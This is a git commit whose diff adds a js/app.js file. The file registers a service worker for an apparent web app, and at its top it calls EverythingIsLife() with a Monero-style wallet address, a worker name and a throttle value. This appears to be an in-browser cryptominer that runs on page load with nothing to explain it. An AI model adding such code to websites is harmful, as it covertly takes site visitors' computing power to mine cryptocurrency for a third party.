11fe447c9696a2fa9ae6a776626601472eb3fb02
Abd Alrazzaq <devoojs@gmail.com>
2022-01-02 06:42:13 -0800

    p1

---
+++ js/app.js
@@ -0,0 +1,16 @@
+
+let xmr = "";
+    xmr = EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'paw', 50);
+  
+  
+  const container = 
+document.getElementById('.container');
+  
+if ("serviceWorker" in navigator) {
+  window.addEventListener("load", function() {
+    navigator.serviceWorker
+      .register("/serviceWorker.js")
+      .then(res => console.log("service worker registered"))
+      .catch(err => console.log("service worker not registered", err));
+  });
+}
